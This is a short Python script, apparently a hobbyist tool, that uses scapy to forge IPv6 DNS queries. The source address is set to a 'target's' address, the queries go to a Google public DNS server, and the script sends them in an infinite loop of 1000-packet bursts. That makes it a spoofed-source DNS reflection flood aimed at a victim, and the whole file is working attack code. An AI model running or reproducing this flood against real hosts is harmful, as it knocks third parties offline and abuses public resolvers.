from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import UDP
from scapy.layers.inet6 import IPv6
from scapy.sendrecv import sr1, sr, send

application = DNS(rd=1, qd=DNSQR(qname='gplanet.co.il',qtype='AAAA'))
transport = UDP()
transport.dport = 53
network = IPv6()
network.src = "fe80::a4e4:7f77:d7d4:ec77" '''put here target's IPv6 address'''
network.dst = '2001:4860:4860::8844' '''google IPv6 server'''


d = network/transport/application
while True:
    send(d*1000)
    '''infitite sending of dns pakcets'''